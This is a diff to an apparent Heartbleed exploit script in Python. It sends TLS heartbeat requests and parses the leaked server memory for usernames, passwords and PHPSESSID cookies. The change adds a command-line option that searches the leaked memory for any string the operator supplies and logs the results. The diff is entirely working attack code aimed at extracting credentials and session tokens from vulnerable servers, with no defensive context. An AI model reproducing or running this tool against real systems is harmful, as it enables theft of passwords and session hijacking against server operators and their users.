@@ -33,6 +33,7 @@ options.add_option('-v', '--verbose', default=False, help='Run exploit script an
 options.add_option('-q', '--quiet', default=False, help='Run exploit script without dumping output to the console (default: false)', action='store_true')
 options.add_option('-c', '--cookie', default=False, help='Detect whether exploit returned any cookies (default: false)', action='store_true')
 options.add_option('-w', '--pwd', default=False, help='Detect whether exploit returned any passwords (default: false)', action='store_true')
+options.add_option('-k', '--key', type='str', default='', help='Input key to extract from server dump (default: empty)')
 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
@@ -119,7 +120,7 @@ def getCredentials(info, key):
             i = info.index(key)
     return items
 
-def hexdump(s, file, quiet, verbose):
+def hexdump(s, file, key, quiet, verbose):
 
     # Open output file (if specified by user)
     if len(file) > 0:
@@ -159,11 +160,15 @@ def hexdump(s, file, quiet, verbose):
     passwords = getCredentials(info, 'password')
     # Get user cookie from leaked memory
     cookies = getCredentials(info, 'PHPSESSID')
+    # Search for key provided by user (if any)
+    query = []
+    if len(key) > 0:
+        query = getCredentials(info, key)
 
     if len(file) == 0 and not quiet:
         print
 
-    return users, passwords, cookies, hasPwd, hasCookie
+    return users, passwords, cookies, query, hasPwd, hasCookie
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
@@ -197,7 +202,7 @@ def recvmsg(s, quiet):
     consoleLog(_tmp, quiet)
     return typ, ver, pay
 
-def hit_hb(s, file, pwd, cookie, quiet, verbose):
+def hit_hb(s, file, pwd, cookie, key, quiet, verbose):
     s.send(hb)
     while True:
         typ, ver, pay = recvmsg(s, quiet)
@@ -208,7 +213,7 @@ def hit_hb(s, file, pwd, cookie, quiet, verbose):
         if typ == 24:
             consoleLog('Received heartbeat response:', quiet)
             # Parse information from heartbeat response
-            users, passwords, cookies, hasPwd, hasCookie = hexdump(pay, file, quiet, verbose)
+            users, passwords, cookies, query, hasPwd, hasCookie = hexdump(pay, file, key, quiet, verbose)
 
             # Log to console the list of users
             logList(users[1:], 'USERS', colors.OKBLUE, quiet)
@@ -216,6 +221,13 @@ def hit_hb(s, file, pwd, cookie, quiet, verbose):
             logList(passwords, 'PASSWORDS', colors.OKBLUE, quiet)
             # Log to console the list of cookies
             logList(cookies, 'COOKIE', colors.OKBLUE, quiet, '\n')
+
+            # If user specified a key, then log search results
+            if len(key) > 0:
+                if len(query) > 0:
+                    logList(query, 'QUERY (key)', colors.HEADER, quiet, '\n')
+                else:
+                    consoleLog(colors.HEADER + 'QUERY (key): ' + colors.END + 'no results\n', quiet)
 
             if hasCookie and cookie:
                 consoleLog(colors.HEADER + 'COOKIE: ' + colors.END + 'server returned cookies - check output', quiet)
@@ -231,7 +243,7 @@ def hit_hb(s, file, pwd, cookie, quiet, verbose):
 
         if typ == 21:
             consoleLog('Received alert:', quiet)
-            hexdump(pay, file, quiet, verbose)
+            hexdump(pay, file, key, quiet, verbose)
             consoleLog(colors.FAIL + 'ERROR: ' + colors.END + 'server returned error, likely not vulnerable', quiet)
             return False
 
@@ -268,7 +280,7 @@ def main():
       consoleLog(_tmp, opts.quiet)
       sys.stdout.flush()
       s.send(hb)
-      hit_hb(s, opts.file, opts.pwd, opts.cookie, opts.quiet, opts.verbose)
+      hit_hb(s, opts.file, opts.pwd, opts.cookie, opts.key, opts.quiet, opts.verbose)
 
 if __name__ == '__main__':
     main()
